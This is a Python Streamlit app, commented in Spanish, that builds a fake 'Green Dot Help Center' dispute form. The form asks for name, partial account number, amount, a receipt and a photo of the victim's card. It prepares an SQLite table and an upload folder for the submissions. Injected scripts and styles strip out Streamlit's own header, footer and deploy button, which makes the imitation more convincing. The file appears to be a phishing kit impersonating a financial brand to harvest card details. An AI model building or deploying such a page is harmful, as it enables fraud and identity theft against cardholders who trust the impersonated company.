
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)"""
    )
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# JS DE VISIBILIDAD RADICAL (v1.3.2)
st.markdown("""<script>
    const reinforceUI = () => {
        // Seleccionar específicamente los textos de ayuda del uploader
        const uploaderLabels = document.querySelectorAll('[data-testid="stFileUploader"] div[data-testid="stMarkdownContainer"] p, [data-testid="stFileUploader"] small');
        uploaderLabels.forEach(el => {
            el.style.setProperty('color', '#FFFFFF', 'important');
            el.style.setProperty('opacity', '1', 'important');
            el.style.setProperty('-webkit-text-fill-color', '#FFFFFF', 'important');
        });

        // Forzar fondo negro en el contenedor para asegurar contraste
        document.querySelectorAll('[data-testid="stFileUploader"] section').forEach(section => {
            section.style.setProperty('background-color', '#1a1a1a', 'important');
        });

        // Limpieza de interfaz
        ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]'].forEach(s => {
            document.querySelectorAll(s).forEach(el => el.remove());
        });
    };
    setInterval(reinforceUI, 50);
</script>""", unsafe_allow_html=True)

# CSS DE ALTA ESPECIFICIDAD
st.markdown("""<style>
    html, body, .stApp {
        background-color: #000000 !important;
    }

    /* FUERZA BRUTA PARA EL TEXTO DEL UPLOADER */
    [data-testid="stFileUploader"] * {
        color: #FFFFFF !important;
    }

    [data-testid="stFileUploader"] small {
        color: #FFFFFF !important;
        font-weight: 600 !important;
    }

    /* Evitar que el modo claro de iOS/Android lo ponga gris */
    p, span, label, div {
        color: #FFFFFF !important;
    }

    .stButton > button {
        background-color: #00a05b !important;
        color: #FFFFFF !important;
        border: 1px solid #FFFFFF !important;
    }

    .block-container {
        max-width: 500px !important;
        background-color: #000000 !important;
    }

    header, footer, .stDeployButton { display: none !important; }
</style>""", unsafe_allow_html=True)

if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
st.title("Help Center")
st.write("Please fill out the form to submit your dispute.")

with st.form("claim_v1_3_2", clear_on_submit=True):
    st.text_input("Full Name")
    st.text_input("Last 4 digits of Account")
    st.number_input("Disputed Amount", format="%.2f")
    st.file_uploader("Store Receipt", type=["jpg","png"])
    st.file_uploader("Card Photo", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("Claim Received.")
